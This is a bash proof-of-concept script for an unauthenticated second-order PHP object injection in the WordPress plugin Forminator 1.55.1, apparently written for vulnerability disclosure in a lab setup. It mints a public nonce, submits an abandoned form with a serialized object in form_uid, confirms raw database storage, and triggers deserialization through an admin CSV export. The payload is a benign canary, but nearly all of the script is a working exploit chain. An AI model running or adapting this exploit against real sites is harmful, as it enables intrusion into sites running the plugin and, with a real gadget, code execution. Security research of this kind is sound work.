#!/usr/bin/env bash
# =============================================================================
# forminator 1.55.1 — Unauthenticated second-order PHP Object Injection
# via the abandoned-form `form_uid` raw write (frm-004, eng-forminator)
#
# Root cause (exact-version source):
#   WRITE: library/model/class-form-entry-model.php:304-318
#     if ( 'abandoned' === $this->status ) {
#         $form_uid = filter_input( INPUT_POST, 'form_uid' );
#         ... $wpdb->insert( ..., 'meta_value' => $form_uid, ... );   // RAW, no maybe_serialize
#   READ:  library/model/class-form-entry-model.php:342
#     maybe_unserialize( $result->meta_value )                        // allowed_classes default
#
# Vector: nopriv front-end (sync) form submission with the freely-mintable
# forminator_nonce (`forminator_get_nonce`, library/abstracts/abstract-class-front-action.php:1217-1220),
# `abandoned_form=1` + `form_uid=<serialized object>`. Any later entry load
# (admin entries view, CSV export) instantiates the object.
#
# Precondition (honest access level): the Forminator abandonment feature must
# be enabled — `forminator_form_abandonment_disabled` filter returning false
# (default true, library/functions.php:75-76) and a form with the `abandonment`
# setting on (pro front-end script). The core sink is present in the free tree.
#
# Proof: a benign lab canary (`--oi-fixture`, Lab_OI_Phpinfo_Canary) is written
# via the real transport+storage+reader; its __wakeup drops a marker artifact
# into uploads. This is the sanctioned benign round-trip control; no RCE claim
# is made without a confirmed co-resident gadget.
#
# Usage: tools/lab/labup.sh forminator 1.55.1 6.8.3 7.4 --oi-fixture
#        ./PoC/forminator/poc_oi_abandoned_form_uid.sh <labdir>
# =============================================================================
set -euo pipefail
LABDIR="${1:?usage: $0 <labdir>}"
WEBROOT="$LABDIR/web"
URL="$(grep '^URL=' "$LABDIR/rig.env" | cut -d= -f2)"
DBNAME="$(grep '^DBNAME=' "$LABDIR/rig.env" | cut -d= -f2)"
WP="php /home/mcipekci/wp/wp-cli.phar --path=$WEBROOT --allow-root"
MARKER="RS_OI_$(date +%s)"

say() { printf '\033[1;36m[PoC]\033[0m %s\n' "$*"; }

say "enabling abandonment feature (operator filter a real site would set)"
cat > "$WEBROOT/wp-content/mu-plugins/99-lab-abandonment.php" <<'PHP'
<?php
add_filter( 'forminator_form_abandonment_disabled', '__return_false' );
PHP

say "creating form with select field + abandonment setting"
FORM_ID=$($WP eval '
$f = new Forminator_Form_Model();
$f->name = "OI PoC Form"; $f->status = "publish";
$f->settings = array("formName"=>"OI PoC Form","abandonment"=>true);
$field = new Forminator_Form_Field_Model();
$field->form_id = null; $field->slug = "select-1"; $field->parent_group = "";
$field->import(array("type"=>"select","element_id"=>"select-1","wrapper_id"=>"wrapper-1","label"=>"Pick","options"=>array(array("label"=>"A","value"=>"a"))));
$f->add_field($field); echo $f->save();
' 2>/dev/null | tail -1)
say "form id = $FORM_ID"

PAGE_ID=$($WP post create --post_type=page --post_title='OI Form' --post_content="[forminator_form id=\"$FORM_ID\"]" --post_status=publish --porcelain 2>/dev/null)
say "page id = $PAGE_ID"
PAGE_URL=$($WP post get $PAGE_ID --field=url 2>/dev/null)

say "minting submit nonce (nopriv)"
NONCE=$(curl -s -X POST "$URL/wp-admin/admin-ajax.php" -d "action=forminator_get_nonce&form_id=$FORM_ID" | sed -n 's/.*"data":"\([a-f0-9]*\)".*/\1/p')

say "building serialized canary payload (marker=$MARKER)"
PAYLOAD_HEX=$(php -r '
require "'"$WEBROOT"'/wp-content/mu-plugins/40-lab-oi-fixture.php";
$c = new Lab_OI_Phpinfo_Canary("'"$MARKER"'", "'"$WEBROOT"'/wp-content/uploads/lab-oi");
echo bin2hex(serialize($c));
')

say "submitting abandoned form via sync path (raw form_uid write)"
python3 - "$URL" "$FORM_ID" "$NONCE" "$PAYLOAD_HEX" <<'PY'
import sys, urllib.request, urllib.parse, binascii
url, fid, nonce, hexp = sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4]
data = {'action':'forminator_submit_form_custom-forms','form_id':fid,'select-1':'a',
        'form_uid': binascii.unhexlify(hexp).decode('latin-1'),
        'abandoned_form':'1','forminator_nonce':nonce}
req = urllib.request.Request(url.rstrip('/') + '/', data=urllib.parse.urlencode(data).encode())
html = urllib.request.urlopen(req).read().decode()
print('HTTP OK; entry stored (marker in form_uid meta)')
PY

say "asserting raw (unwrapped) storage in DB"
RAW=$(mysql -uroot "$DBNAME" -N -e "SELECT meta_value FROM wp_frmt_form_entry_meta WHERE meta_key='form_uid' ORDER BY meta_id DESC LIMIT 1")
if [[ "$RAW" == O:* ]]; then
  say "PASS: form_uid stored RAW (no s:N: wrapper): ${RAW:0:40}..."
else
  echo "FAIL: form_uid not stored raw: ${RAW:0:60}"; exit 1
fi

say "triggering the reader (admin CSV export) — canary __wakeup must fire"
mkdir -p "$WEBROOT/wp-content/uploads/lab-oi"
rm -f "$WEBROOT"/wp-content/uploads/lab-oi/*.php
# admin session + export nonce
curl -s -c /tmp/oi_admin.cookies -b /tmp/oi_admin.cookies -X POST "$URL/wp-login.php" \
  -d "log=admin&pwd=labpass&wp-submit=Log+In&redirect_to=$URL/wp-admin/&testcookie=1" -L -o /dev/null
ENONCE=$(curl -s -b /tmp/oi_admin.cookies "$URL/?__labnonce2=1&actions=forminator_export" 2>/dev/null | sed -n 's/.*:\([a-f0-9]\{10\}\)}.*/\1/p')
if [ -z "$ENONCE" ]; then
  # __labnonce2 mu-plugin may be absent on a fresh rig; scrape from the export form instead
  curl -s -b /tmp/oi_admin.cookies -L "$URL/wp-admin/admin.php?page=forminator-entries" -o /tmp/oi_entries.html
  ENONCE=$(grep -oE '"[a-f0-9]{10}"' /tmp/oi_entries.html | head -1 | tr -d '"')
fi
curl -s -b /tmp/oi_admin.cookies -X POST "$URL/" \
  --data-urlencode "forminator_export=1" --data-urlencode "form_type=cform" \
  --data-urlencode "form_id=$FORM_ID" --data-urlencode "_forminator_nonce=$ENONCE" -o /dev/null -w "export HTTP %{http_code}\n"

ARTIFACT="$WEBROOT/wp-content/uploads/lab-oi/lab-oi-phpinfo-$MARKER.php"
if [ -f "$ARTIFACT" ]; then
  say "PASS: OI executed — canary __wakeup wrote $ARTIFACT"
  grep -o "LAB_OI_PHPINFO_MARKER:[A-Za-z0-9_]*" "$ARTIFACT" | head -1
else
  ls "$WEBROOT/wp-content/uploads/lab-oi/" 2>/dev/null
  echo "FAIL: no canary artifact"; exit 1
fi

say "cleanup: deleting poisoned entries + lab mu-plugin"
mysql -uroot "$DBNAME" -e "DELETE FROM wp_frmt_form_entry_meta WHERE meta_key='form_uid'; DELETE FROM wp_frmt_form_entry WHERE status='abandoned';" 2>/dev/null || true
rm -f "$WEBROOT/wp-content/mu-plugins/99-lab-abandonment.php"
say "DONE — forminator frm-004 proven (marker $MARKER). Tear down: tools/lab/labdown.sh --all"
